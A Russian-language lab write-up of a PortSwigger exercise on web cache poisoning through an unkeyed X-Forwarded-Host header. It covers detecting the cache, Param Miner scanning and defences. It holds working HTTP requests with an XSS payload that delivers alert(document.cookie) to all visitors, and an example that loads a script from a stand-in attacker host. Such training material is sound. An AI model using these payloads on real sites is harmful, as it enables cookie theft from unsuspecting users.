#### Использование отравления веб-кэша для использования небезопасного обращения с импортом ресурсов

пример:

```http
GET / HTTP/1.1 
Host: innocent-website.com 
X-Forwarded-Host: evil-user.net 
User-Agent: Mozilla/5.0 Firefox/57.0 

HTTP/1.1 200 OK <script src="https://evil-user.net/static/analytics.js"></script>
```
это отравление кеша через подмену внешнего скрипта
кеш видит только host ([innocent-website.com]) и не включает x-forwarded-host в свой ключ

поэтому когда атакующий отправляет запрос с x-forwarded-host: [evil-user.net], кеш сохраняет ответ для host [innocent-website.com]

но бэкенд при генерации ответа использует значение `x-forwarded-host` и вставляет в страницу ссылку на скрипт с сервера атакующего

--------------

🔶 лаба https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
##### Отравление веб-кэша с заголовком без ключа (unkeyed header)

задача: отравить веб кеш так, чтобы все юзеры посещающие его после атаки (с учетом времени жизни ключа) - получили в своем браузере -  `   alert(document.cookie)   `

---------

вот запрос на главную страницу - оригинальный
```http
GET / HTTP/2
Host: 0a2c00aa0328399e80240d9900d9006e.web-security-academy.net
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

вижу в ответе запроса на главную страницу 
```http
ответ

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=BfKMsDw8yEvdIGrleE7mBjHD8RH6WJMU; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 11052
```

есть 
```c
Cache-Control: max-age=30
```
то есть, что-то сохраняется в кеш и хранится там 30 сек!
![[Снимок экрана 2026-03-24 в 10.31.29.png]]

этот же запрос повторно делаю и вижу
```http
повторный ответ

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 4
X-Cache: hit
Content-Length: 11052
```

```c
Age: 4        -- уже 4 сек этому кешу (но макс жизнь его 30 сек)
X-Cache: hit  -- ТО ЕСТЬ ОТВЕТ Я ПОЛУЧИЛ ИЗ КЕША
```
![[Снимок экрана 2026-03-24 в 10.34.52.png]]


------
я добавил заголовок `X-Forwarded-Host: 6666`
```http
GET / HTTP/2
Host: 0a2c00aa0328399e80240d9900d9006e.web-security-academy.net
X-Forwarded-Host: 6666
```

и запрос отразился в html
![[Снимок экрана 2026-03-24 в 10.41.17.png]]

 И ВОТ САМОЕ ВЕСЕЛОЕ - САМОЕ ВАЖНОЕ
я сделал вот так повторно запрос уже без  X-Forwarded-Host
```http
GET / HTTP/2
Host: 0a2c00aa0328399e80240d9900d9006e.web-security-academy.net
```

НО В ОТВЕТЕ - все равно есть в html 
`<script type="text/javascript" src="//6666/resources/js/tracking.js"></script>`

![[Снимок экрана 2026-03-24 в 10.43.52.png]]

то есть этот заголовок помимо того, что сам по себе отражается в html 
так он еще и сохраняется в кеш сервера, и в течении 30 сек раздается и всем другим юзерам!

-----
`<script type="text/javascript" src="//6666/resources/js/tracking.js"></script>`
если здесь плохая защита от спец-символов , нет санитаризации , то можно будет сделать XSS 

-----

с лету делаю
`X-Forwarded-Host: "></script>;<script>alert("1")</script>"`
отражается так
```html
           <script type="text/javascript" src="//"></script>;
           <script>alert("1")</script>
           "/resources/js/tracking.js"></script>
```
![[Снимок экрана 2026-03-24 в 10.55.57.png]]

------

теперь я просто из любого браузера делаю запрос к главной стр в течении 30 сек после отравления кеша

и получаю алерт!

![[Снимок экрана 2026-03-24 в 10.56.55.png]]

--------

теперь меняю алерт на алерт по заданию с куками document.cookie
вот так
```http
GET / HTTP/2
Host: 0a2c00aa0328399e80240d9900d9006e.web-security-academy.net
X-Forwarded-Host: "></script>;<script>alert(document.cookie)</script>"
```

и все, лаба решена!!!!!

------

пробую найти эту уязвимость через `PARAM MINER` в burp
перезапустил лабу

много режимов
```c
-----------------
👉Guess headers — перебирает названия заголовков (x-forwarded-host, x-original-url, x-rewrite-url, forwarder и др.), чтобы найти скрытые неключевые заголовки, которые влияют на ответ и могут использоваться для кеш-поэзинга, ssrf или обхода валидации
-----------------
👉Guess query params — перебирает названия параметров в строке запроса, чтобы найти скрытые параметры (например, debug=true), которые не видны в интерфейсе, но меняют поведение сервера
-----------------
👉Guess cookies — перебирает названия кук, чтобы найти скрытые флаги или параметры, влияющие на аутентификацию или логику приложения
-----------------
👉Guess body params — перебирает названия параметров в теле запроса для post, put, patch, чтобы найти скрытые поля в формах или api
-----------------
👉Guess everything! — запускает одновременно все режимы перебора (headers, query params, cookies, body params)
-----------------
👉Detect scoped-SSRF — проверяет, может ли сайт делать запросы к внутренним ip-адресам через ssrf, с учетом ограничений (scope), отправляя запросы к collaborator через разные заголовки и параметры
-----------------
👉Exploit scoped-SSRF — автоматизирует эксплуатацию ssrf для доступа к внутренним сервисам, перебирая ip-адреса в заданном диапазоне
-----------------
👉Detect server-side injection port-DoS — проверяет, можно ли через параметр или заголовок вызвать длительную операцию на сервере (например, подключение к закрытому порту с таймаутом), что может привести к отказу в обслуживании
-----------------
👉Unkeyed param fat GET — ищет параметры, которые обрабатываются сервером даже если их передать в теле get-запроса (fat get), чтобы обойти кеш-ключ и отравить кеш
-----------------
👉input transformation normalised param normalised path — проверяет, как сервер нормализует ввод (url-декодирование, удаление слешей, преобразование регистра), и находит расхождения между кешем и бэкендом, которые можно использовать для кеш-поэзинга
-----------------
👉rails param cloaking scan — специальный режим для rails-приложений, ищет уязвимость cache parameter cloaking, используя особенности парсинга параметров (ampersand и точка с запятой)
-----------------
👉identify header smuggling mutations — ищет различия в обработке заголовков между фронтендом и бэкендом (как парсится transfer-encoding, content-length, пробелы, обернутые строки), которые можно использовать для http request smuggling
-----------------
```

![[Снимок экрана 2026-03-24 в 11.12.20.png]]

запустил режим ==Guess headers==

вот результаты сканирования
```c
Queued 1 attacks from 1 requests in 0 seconds
Initiating header bruteforce on 0a8e000804b64a5781bcf21c006500d4.web-security-academy.net
Identified parameter on 0a8e000804b64a5781bcf21c006500d4.web-security-academy.net: x-forwarded-host~%s.%h
```

как видно - он тоже нашел `x-forwarded-host` 

------
### ключевые моменты

1) добавил свой заголовок X-Forwarded-Host и он отразился в html (сразу намек на xss)
2) вижу по X-Cache: hit и X-Cache: miss и Cache-Control: max-age=30, что ответ кешируется
3) далее выяснил, что значение из X-Forwarded-Host - тоже попадает к кеш
4) добавил xss пейлоад в X-Forwarded-Host, и не было никакой санитаризации смволов
5)  я смог выполнить js код, + ответ брался из кеша, все запросы к этой стра - шли из зараженного кеша.

6) базово нашел этот заголовок через сканер `PARAM MINER` в burp


#### защита

отключить поддержку всех неиспользуемых заголовков, особенно x-forwarded-host, x-forwarded-scheme, x-original-url и подобных

если заголовок необходим для работы через прокси, настроить строгую валидацию - принимать его только с доверенных ip-адресов прокси, а не из внешних запросов

никогда не использовать значение заголовка для генерации контента без экранирования

все динамические части, которые формируются из заголовков, должны проходить санитаризацию или быть заэкранированы для контекста html, javascript атрибутов

кешировать только статические ответы, которые не зависят от заголовков пользователя

если кеш все же нужен, убедиться, что все заголовки, влияющие на ответ, включены в кеш-ключ или явно перечислены в vary

настроить cdn и reverse proxy так, чтобы они не кешировали ответы, которые содержат динамические элементы, зависящие от пользовательских заголовков

использовать param miner или аналогичные инструменты для аудита - они помогут обнаружить неключевые заголовки, которые отражаются в ответе

проверять, что при повторном запросе без вредоносного заголовка, вредоносный контент не возвращается из кеша

если в ответе есть cache-control: max-age и x-cache: hit, значит кеш работает и его можно проверить на отравление

заголовки age и x-cache - это индикаторы, которые помогают понять поведение кеша, но полагаться только на них для защиты нельзя